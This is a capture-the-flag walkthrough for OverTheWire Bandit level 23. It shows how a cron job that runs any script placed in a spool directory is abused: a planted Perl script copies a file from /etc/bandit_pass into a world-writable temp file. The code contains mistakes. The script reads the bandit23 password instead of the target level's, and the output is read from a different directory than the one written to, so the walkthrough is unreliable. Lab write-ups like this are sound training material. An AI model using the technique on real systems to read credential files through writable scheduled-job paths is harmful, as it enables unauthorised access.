# Over the Wire Bandit Walkthrough (Writeup): http://overthewire.org/wargames/bandit/

## Writeup

## Level 23
**Description**
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

**Solution**
The bandit24 cronjob script is running under /usr/bin/cronjob_bandit24. Viewing the script, it appears that the script executes and deletes all scripts in the /var/spool/bandit24 directory. 

```bash
bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24 
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 "./$i"
	rm -f "./$i"
    fi
done

```

It looks like I can just write a script that gets the password and writes it into another file I can view. I wrote the following script and copied it into the /var/spool/bandit24 directory.

```bash
bandit23@melinda:/tmp/temp0000098$ touch getpass.pl
bandit23@melinda:/tmp/temp0000098$ touch output.txt
bandit23@melinda:/tmp/temp0000098$ chmod 777 *
bandit23@melinda:/tmp/temp0000098$ vi getpass.pl
bandit23@melinda:/tmp/temp0000098$ cp getpass.pl /var/spool/bandit24/getpass.pl
```

```perl
#!/usr/bin/perl 
system('cat /etc/bandit_pass/bandit23 > /tmp/temp0000098/output.txt');
```

Then all was left to let the cronjob run and cat the file in my temp directory.

```bash
bandit23@melinda:/tmp/meohmy$ cat output.txt 
<password>
```




